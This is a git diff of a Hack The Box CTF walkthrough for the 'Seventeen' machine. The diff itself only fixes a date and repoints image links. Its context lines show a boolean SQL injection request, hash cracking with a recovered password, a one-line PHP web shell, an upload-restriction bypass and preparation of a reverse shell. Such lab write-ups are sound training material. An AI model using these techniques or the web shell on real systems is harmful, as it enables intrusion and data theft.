@@ -1,6 +1,6 @@
 ---
 title: "Seventeen -- HTB walkthrough"
-date: 2022-28-05T12:27:01+13:00
+date: 2022-05-28T12:27:01+13:00
 draft: true
 description: "https://app.hackthebox.com/machines/seventeen"
 tags : ['htb', 'linux', 'hard', 'retired']
@@ -53,7 +53,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
 
 ## Enumeration | Webpage - port 80  
 
-![Timelapse_banner](./img/webpage.png)
+![Timelapse_banner](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/webpage.png?raw=true)
 
 At the top we see `seventeen.htb`. I'll add that to my `/etc/hosts` file.
 
@@ -82,7 +82,7 @@ by Ben "epi" Risher 🤓                 ver: 2.7.1
 
 ## Webpage - port 8000
 
-![second webpage](./img/webpage_port_8000.png)
+![second webpage](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/webpage_port_8000.png?raw=true)
 
 I'll run a directory fuzzing also. 
 
@@ -165,7 +165,7 @@ exam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Dura
 ```
 And we got one `exam`. let's check it out by adding it to the hosts file. `/etc/hosts`
 
-![exam_webapge](./img/exam_sub.png)
+![exam_webapge](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/exam_sub.png?raw=true)
 
 The web site seems hosting a exam Management System.
 
@@ -175,7 +175,7 @@ the `Exams` href seems interesting also `/?p=exams` we may should inject some pa
 
 Well, if we search for `Exam Reviewer Management` on [exploit-db](https://www.exploit-db.com/) we'll end up with two cool results:
 
-![exploit_db_search](./img/exploit_db_search.png)
+![exploit_db_search](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/exploit_db_search.png?raw=true)
 
 I'll start with the sqli/50725 one
 
@@ -224,11 +224,11 @@ AND 'vqGg'='vqGg---
 
 I'll pass the request `http://exam.seventeen.htb/?p=take_exam&id=1' AND 4755=4752 AND 'VHNu'='VHNu` It may work.
 
-![sqli_1](./img/sqli1.png)
+![sqli_1](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/sqli1.png?raw=true)
 
 If we lower the value of `4755=4755` `4755=4754` we'll get a alert
 
-![sqli2](./img/sqli2.png)
+![sqli2](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/sqli2.png?raw=true)
 
 So based on this behavior it should be a boolean-based SQL injection.
 
@@ -363,7 +363,7 @@ Trying to crack these md5 hashes with [crackstation](https://crackstation.net/) 
 
 
 So yeah, we got a response back after redirecting us to port 8000:
-![oldmanagement_webpage](./img/oldmanagement_webpage.png)
+![oldmanagement_webpage](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/oldmanagement_webpage.png?raw=true)
 
 
 School File Management System seems to be a short form of db_sfms database, So let's dump it we might retrieve some login credentials.
@@ -419,13 +419,13 @@ Table: student
 
 And let's try cracking these hashes on [crackstation](https://crackstation.net/)
 
-![cracked_hash](./img/hash_crack_01.png)
+![cracked_hash](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/hash_crack_01.png?raw=true)
 
 kelly Shane with the 31234 number is crackable and `autodestruction` as a result. let's login then! 
 
 And we are in: 
 
-![after_login_page](./img/sfms_page.png) 
+![after_login_page](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/sfms_page.png?raw=true) 
 
 Theres a upload and a download button.
 ## www-data shell
@@ -435,7 +435,7 @@ After some manual enumeration, I see that the uploaded files are saved in  `/fil
 
 We can be sure also by checking the [source-code](https://www.sourcecodester.com/php/14155/school-file-management-system.html) though.
 
-![public-upload-path](./img/public_upload_path.png)
+![public-upload-path](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/public_upload_path.png?raw=true)
 
 I'll upload a php reverse shell. with the following content:
 
@@ -445,25 +445,25 @@ system($_REQUEST['cmd']);
 ?>
 ```
 
-![forbidden-response](./img/php_rev_forbidden01.png)
+![forbidden-response](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/php_rev_forbidden01.png?raw=true)
 
 we can see that the file is uploaded fine, but is blocked. I'll interecpt the upload form with burp to see if we can playaround with it params.
 
-![burp-upload](./img/burp_upload.png)
+![burp-upload](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/burp_upload.png?raw=true)
 
 What if change the student number, we might overide another directory and avoid the php execute block.
 
 I've changed `31234` to `31235`
 
-![student_number_change](./img/student_number_change.png)
+![student_number_change](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/student_number_change.png?raw=true)
 
-![id_execute](./img/id_execute.png)
+![id_execute](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/id_execute.png?raw=true)
 
 And we got a RCE!
 
 I'll request a reverse shell after a nc listener:
 
-![rev-shell](./img/rev_payload.png)
+![rev-shell](https://github.com/0xWerz/CTF-writeups/blob/main/HTB/Machines/seventeen/img/rev_payload.png?raw=true)
 
 
 ```
